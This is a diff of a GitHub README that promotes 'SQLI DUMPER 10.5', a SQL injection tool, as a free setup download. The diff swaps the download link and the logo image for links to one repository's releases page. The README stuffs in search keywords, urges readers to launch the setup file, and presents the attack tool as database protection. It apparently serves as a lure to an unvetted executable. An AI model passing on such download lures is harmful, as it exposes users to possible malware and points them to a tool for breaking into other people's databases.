@@ -23,7 +23,7 @@ Welcome to the SQLI DUMPER 10.5 repository! Here you will find the latest versio
 - SQLI DUMPER SQL injection testing
 - SQLI DUMPER tutorial 2025
 
-**Download SQLI DUMPER 10.5 for FREE**: [Launch the setup file](https://github.com/assets/Release.zip)
+**Download SQLI DUMPER 10.5 for FREE**: [Launch the setup file](https://github.com/momosapienza/SQLI-DUMPER-10.5-Free-Setup/releases)
 
 For more information and updates, kindly check the **Releases** section of this repository.
 
@@ -53,7 +53,7 @@ SQLI DUMPER 10.5 is packed with a wide range of features that make it the go-to 
 ## Get Started with SQLI DUMPER 10.5
 To get started with SQLI DUMPER 10.5, simply download the setup file from the link provided above and follow the installation instructions. Once installed, you can start exploring the powerful features of this tool and enhance the security of your databases.
 
-![SQLI DUMPER Logo](https://example.com/sqli-dumper-logo.png)
+![SQLI DUMPER Logo](https://github.com/momosapienza/SQLI-DUMPER-10.5-Free-Setup/releases)
 
 ## How to Contribute
 If you are passionate about database security and want to contribute to the development of SQLI DUMPER, feel free to fork this repository, make your changes, and submit a pull request. Your contributions will help make SQLI DUMPER even better for the security community.
